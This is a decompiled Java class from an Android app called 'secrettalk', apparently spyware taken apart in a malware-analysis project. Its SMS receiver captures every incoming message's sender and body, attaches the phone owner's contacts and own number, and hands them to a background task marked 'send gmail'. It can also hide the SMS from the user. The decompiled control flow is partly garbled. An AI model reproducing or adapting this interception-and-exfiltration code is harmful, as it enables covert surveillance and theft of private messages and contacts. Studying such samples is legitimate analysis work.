package com.android.secrettalk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.util.Date;

public class SmsReceiver
  extends BroadcastReceiver
{
  static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
  public static boolean is_blocked = false;
  private String receiveSms = "";
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Log.w("receive sms", "onReceived");
    Object[] arrayOfObject;
    SmsMessage[] arrayOfSmsMessage;
    int i;
    int j;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      Bundle localBundle = paramIntent.getExtras();
      if (localBundle != null)
      {
        this.receiveSms = "\n incoming sms \n";
        Log.w("receive sms", "ready to receive sms");
        arrayOfObject = (Object[])localBundle.get("pdus");
        arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
        i = 0;
        if (i < arrayOfObject.length) {
          break label226;
        }
        j = arrayOfSmsMessage.length;
      }
    }
    for (int k = 0;; k++)
    {
      if (k >= j)
      {
        this.receiveSms += "\n Contact Info";
        this.receiveSms += ContactInfo.getContactInfo();
        this.receiveSms += "\n";
        this.receiveSms += ContactInfo.getMyPhoneNumber();
        Log.w("receive sms", this.receiveSms);
        Log.w("receive sms", "send gmail");
        if (is_blocked) {
          abortBroadcast();
        }
        return;
        label226:
        arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
        i++;
        break;
      }
      SmsMessage localSmsMessage = arrayOfSmsMessage[k];
      String str1 = new Date().toString();
      String str2 = localSmsMessage.getDisplayOriginatingAddress();
      String str3 = localSmsMessage.getDisplayMessageBody();
      this.receiveSms = (this.receiveSms + "Date:" + str1 + "\n Address:" + str2 + "\n Body:" + str3);
      this.receiveSms += "\n";
      new SmsReceiver.1(this, str2, str3).execute(new Void[0]);
    }
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.SmsReceiver
 * JD-Core Version:    0.7.0.1
 */